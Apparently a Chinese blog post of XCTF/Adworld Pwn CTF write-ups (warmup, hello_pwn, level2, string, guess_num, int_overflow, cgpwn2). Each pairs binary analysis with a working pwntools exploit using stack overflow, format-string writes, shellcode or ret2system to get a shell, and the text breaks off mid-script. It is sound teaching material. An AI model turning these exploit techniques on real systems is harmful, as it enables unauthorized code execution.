<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">55503</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span>+p32(<span class="number">0x080486cc</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>wp参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43681242/article/details/104152665">(13条消息) 攻防世界PWN进阶区（warmup）_BurYiA的博客-CSDN博客</a></p>
<p>知识补充：模糊测试（Fuzzing），是一种通过向目标系统提供非预期的输入并监视异常结果来发现软件漏洞的方法。fuzz也就是盲打，在啥也没给的情况下一般就是fuzz</p>
<p>直接nc，发现有输出一个地址，还有输入点</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211103161054528.png" alt="image-20211103161054528"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">addr = <span class="number">0x40060d</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz</span>(<span class="params">r, num, flag</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * num</span><br><span class="line">    <span class="keyword">if</span> flag==<span class="number">1</span>:</span><br><span class="line">        payload += p32(addr)</span><br><span class="line">    <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"><span class="comment">#fuzz模块，分三种情况（不用他的地址，p32发，p64发）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = remote(<span class="string">&quot;111.198.29.45&quot;</span>, <span class="number">46588</span>)</span><br><span class="line">                fuzz(r, i, j)</span><br><span class="line">                text = r.recv()</span><br><span class="line">                print(<span class="string">&#x27;text.len=&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(text))+<span class="string">&#x27;text=&#x27;</span>+text)</span><br><span class="line">                print(<span class="string">&#x27;num=&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27; flag=&#x27;</span>+<span class="built_in">str</span>(j))</span><br><span class="line">                r.interactive()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                r.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>脚本跑完就出来了</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://fallsilkworms.github.io/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="YX">
      <meta itemprop="description" content="等一场秋风再起，花开如绎">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fallsilkworm's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/" class="post-title-link" itemprop="url">攻防世界新手Pwn</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2021-11-05 15:30:59 / 修改时间：15:31:24" itemprop="dateCreated datePublished" datetime="2021-11-05T15:30:59+08:00">2021-11-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Bin/" itemprop="url" rel="index"><span itemprop="name">Bin</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="攻防世界pwn新手区"><a href="#攻防世界pwn新手区" class="headerlink" title="攻防世界pwn新手区"></a>攻防世界pwn新手区</h2><h3 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h3><p>照例查</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210731224644451.png" alt="image-20210731224644451"></p>
<p>IDA</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210731224814074.png" alt="image-20210731224814074"></p>
<p>分析if语句知道当dword_60106C=1853186401可以cat flag</p>
<p>可知unk…与dword…这俩变量都在.bss段，相隔4个字符，unk…是由我们输入的，可以利用其覆盖dword…的值就行,ROP直接打掉</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210731224955916.png" alt="image-20210731224955916"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">53218</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;lets get helloworld for bof\n&quot;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> r.recv()</span><br></pre></td></tr></table></figure>
<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>常规</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802140340867.png" alt="image-20210802140340867"></p>
<p>IDA</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802140432092.png" alt="image-20210802140432092"></p>
<p>跟进</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802140447125.png" alt="image-20210802140447125"></p>
<p>读0x100，明显栈溢出，如出一辙跟进buf</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802140530666.png" alt="image-20210802140530666"></p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802140542783.png" alt="image-20210802140542783"></p>
<p>所以buf距离ret的长度为0x88+0x04</p>
<p>发现system和/bin/sh，记录地址</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802140709214.png" alt="image-20210802140709214"></p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802140720269.png" alt="image-20210802140720269"></p>
<p>将返回地址跳转至system函数再压入参数/bin/sh可以获得控制权</p>
<p>但是自己写exp的时候错了，查看wp发现漏了个p32(0)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">65098</span>)</span><br><span class="line">sys=<span class="number">0x08048320</span></span><br><span class="line">sh=<span class="number">0x0804A024</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(sys)+p32(<span class="number">0</span>)+p32(sh)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802141016367.png" alt="image-20210802141016367"></p>
<h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>照例分析</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802213323993.png" alt="image-20210802213323993"></p>
<p>往下运行</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802213432276.png" alt="image-20210802213432276"></p>
<p>是一个很长的文字游戏，输到最后直接就结束了，拖IDA</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802213507980.png" alt="image-20210802213507980"></p>
<p>大致分析得出v4是关键变量，跟进其函数</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802213600097.png" alt="image-20210802213600097"></p>
<p>这就是那个界面了，三个函数分别点进去</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802213639203.png" alt="image-20210802213639203"></p>
<p>第一个没什么用应该</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802213916017.png" alt="image-20210802213916017"></p>
<p>第二个，看见printf，是有一个格式化字符串漏洞</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802214052838.png" alt="image-20210802214052838"></p>
<p>第三个，if语句分析知道是要令a1=a1[1]（a1是啥不知道）</p>
<p>最后得知，a1就是v4，可以利用函数指针来调用系统函数system(“/bin/sh”)来获取控制权限，但是system(“/bin/sh”)并不能被函数指针所理解，这里应该转化成机器码,用<strong>asm(shellcraft.sh())</strong></p>
<p>回溯到main</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802215639897.png" alt="image-20210802215639897"></p>
<p>只需要将v3[0] = 85或者v3[1] = 68，就是通过格式化字符串漏洞使数组的前两个数相等就可以调用函数了。这里选择是前者</p>
<p>需要注意的是：</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802220029709.png" alt="image-20210802220029709"></p>
<p>这个是64位，前六个参数放寄存器，第七个参数开始放在栈中所以偏移量是7</p>
<p>exp就有了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)<span class="comment">#这个不能少</span></span><br><span class="line">r = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">51763</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;What should your character&#x27;s name be:\n&quot;</span>, <span class="string">&quot;aaa&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;So, where you will go?east or up?:\n&quot;</span>, <span class="string">&quot;east&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;go into there(1), or leave(0)?:\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&#x27;Give me an address&#x27;&quot;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;And, you wish is:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">85</span> + <span class="string">&quot;%7$n&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802221002513.png" alt="image-20210802221002513"></p>
<h3 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h3><p>知识补充：<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/cpp-rand-srand.html">C++ rand 与 srand 的用法 </a></p>
<p>照例</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210802221746792.png" alt="image-20210802221746792"></p>
<p>运行</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803001619619.png" alt="image-20210803001619619"></p>
<p>拖IDA</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803001804263.png" alt="image-20210803001804263"></p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803001950624.png" alt="image-20210803001950624"></p>
<p>循环，根据随机数计算的法则输入十个数，不相同就GG，相同就cat flag</p>
<p>考点为栈溢出</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803015022245.png" alt="image-20210803015022245"></p>
<p>中间隔着0x20加seed四个字节</p>
<p>选择用“aaaa”覆盖掉seed，但是写脚本的时候要把aaaa转为十六进制即0x61616161</p>
<p>在Linux里根据IDA里随机数的计算法则写伪随机数脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a, i;</span><br><span class="line">	srand(<span class="number">0x61616161</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">		a=rand()%<span class="number">6</span>+<span class="number">1</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行出来得到</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803015410884.png" alt="image-20210803015410884"></p>
<p>直接完成一个简单的exp脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">60098</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&quot;aaaa&quot;</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;Your name:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">num=[<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;2&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Please input your guess number:&quot;</span>,num[i])</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>法二：利用v7覆盖seed[0],使seed[0]已知，然后算法里循环，就拿到flag了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;111.198.29.45&#x27;,41080)</span></span><br><span class="line">p = process(<span class="string">&#x27;./guess_num&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    num = <span class="built_in">str</span>(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">    p.sendline(num)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<h3 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h3><p>知识补充：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jopny/p/13527880.html">整数溢出</a></p>
<p>照例查运行</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803204915843.png" alt="image-20210803204915843"></p>
<p>吓得我以为要出flag</p>
<p>拖IDA跟进login</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803205002331.png" alt="image-20210803205002331"></p>
<p>跟进strcpy()函数，发现存在栈溢出</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803205112864.png" alt="image-20210803205112864"></p>
<p>可以知道dest距离ret的长度为0x14+4</p>
<p>然后又发现了cat flag</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803205315714.png" alt="image-20210803205315714"></p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803205340200.png" alt="image-20210803205340200"></p>
<p>记录地址0x0804868b</p>
<p>利用整数溢出（在linux环境下，编译器会提醒溢出，但仍然会输出的值）返回ida查看变量v3的值为[3,8)，而输入的密码变量s的长度为0x199，即十进制里的409，又因为v3的类型为unsigned _int8，即[8位无符号整数](<a target="_blank" rel="noopener" href="https://zhidao.baidu.com/question/1818954413951622788.html#:~:text=8%E4%BD%8D%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%89%80%E8%83%BD%E8%A1%A8%E7%A4%BA%E7%9A%84%E6%97%A0%E7%AC%A6%E5%8F%B7%E6%95%B4%E6%95%B0%E8%8C%83%E5%9B%B4%E4%B8%BA0~255%EF%BC%9B8%E4%BD%8D%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%89%80%E8%83%BD%E8%A1%A8%E7%A4%BA%E7%9A%84%E5%B8%A6%E7%AC%A6%E5%8F%B7%E6%95%B4%E6%95%B0%E8%8C%83%E5%9B%B4%E4%B8%BA-128~127%E3%80%82">https://zhidao.baidu.com/question/1818954413951622788.html#:~:text=8位二进制所能表示的无符号整数范围为0~255；8位二进制所能表示的带符号整数范围为-128~127。</a> 无符号数 (Unsigned number)是相对于有符号数而言的，指的是整个机器字长的全部二进制位均表示数值位，相当于数的绝对值。 用二进制数的最高位表示符号，最高位是0，表示正数，最高位是1，表示负数。 这种说法本身没错，可是如果没有下文，那么它就是错的。 至少它不能解释，为什么字符类型的-1用二进制表示是“1111,1111” (16进制为FF)；而不是我们更能理解的“1000 0001”。 有符号整数可表示正整数、0和负整数值。 其二进制编码方式包含 符号位 和 真值域。)，最大值为255。所以v3的最大值为255且为无符号整数,所以当s长度为256时v3=0，所以s的输入长度为[259,264)即可符合v3的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">62179</span>)</span><br><span class="line"></span><br><span class="line">sys=<span class="number">0x0804868b</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(sys)</span><br><span class="line">payload = payload.ljust(<span class="number">259</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Please input your username:&quot;</span>,<span class="string">&quot;111&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Please input your passwd:&quot;</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803210809155.png" alt="image-20210803210809155"></p>
<h3 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h3><p>知识补充：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30321709/article/details/95579948?utm_medium=distribute.pc_relevant.none-task-blog-2~default~searchFromBaidu~default-1.pc_relevant_baidujshouduan&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~searchFromBaidu~default-1.pc_relevant_baidujshouduan">0xdeadbeef</a></p>
<p>常规操作<img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803212301602.png" alt="image-20210803212301602"></p>
<p>IDA跟进</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803212329433.png" alt="image-20210803212329433"></p>
<p>发现gets，栈溢出。很快找到溢出点s</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803212806191.png" alt="image-20210803212806191"></p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803212825087.png" alt="image-20210803212825087"></p>
<p>可知s距离ret长度为0x26+4，随后又记录下system的地址为08048420</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803212923418.png" alt="image-20210803212923418"></p>
<p>不过system没有/bin/sh可以执行，不知道在哪里搞出来，查看wp</p>
<p><strong>得知name在.bss里，可以把它写成/bin/sh</strong></p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803212947420.png" alt="image-20210803212947420"></p>
<p>exp就有了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">51159</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sys=<span class="number">0x08048420</span></span><br><span class="line">sh=<span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x26</span>+<span 